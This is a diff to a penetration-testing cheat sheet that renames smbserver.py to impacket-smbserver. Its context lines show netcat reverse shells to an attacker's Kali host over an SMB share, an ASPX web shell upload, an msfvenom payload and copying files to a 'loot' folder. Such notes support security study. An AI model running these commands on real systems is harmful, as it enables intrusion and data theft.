@@ -865,7 +865,7 @@ http://192.168.119.146/test.hta
 ### Windows rce techniques
 ````
 locate nc.exe
-smbserver.py -smb2support Share .
+impacket-smbserver -smb2support Share .
 nc -nlvp 80
 cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
 ````
@@ -887,7 +887,7 @@ C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
 cp /usr/share/webshells/aspx/cmdasp.aspx .
 cp /usr/share/windows-binaries/nc.exe .
 ftp> put cmdasp.aspx
-smbserver.py -smb2support Share .
+impacket-smbserver -smb2support Share .
 http://<target $IP>:<port>/cmdasp.aspx
 nc -nlvp <port on your kali>
 cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
@@ -1079,7 +1079,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le
 ## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
 ### SMB Linux to Windows
 ````
-smbserver.py -smb2support Share .
+impacket-smbserver -smb2support Share .
 cmd.exe /c //<your kali IP>/Share/<file name you want>
 ````
 ````
@@ -1088,7 +1088,7 @@ net use \\<your kali IP>\share /u:df df
 copy \\<your kali IP>\share\<file wanted>
 ````
 ````
-smbserver.py -smb2support Share .
+impacket-smbserver -smb2support Share .
 net use \\<your kali IP>\share
 copy \\<your kali IP>\share\whoami.exe
 ````
@@ -1111,7 +1111,7 @@ copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali
 You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
 ````
 ````
-smbserver.py -username df -password df share . -smb2support
+impacket-smbserver -username df -password df share . -smb2support
 net use \\10.10.16.9\share /u:df df
 copy \\10.10.16.9\share\<file wanted>
 ````
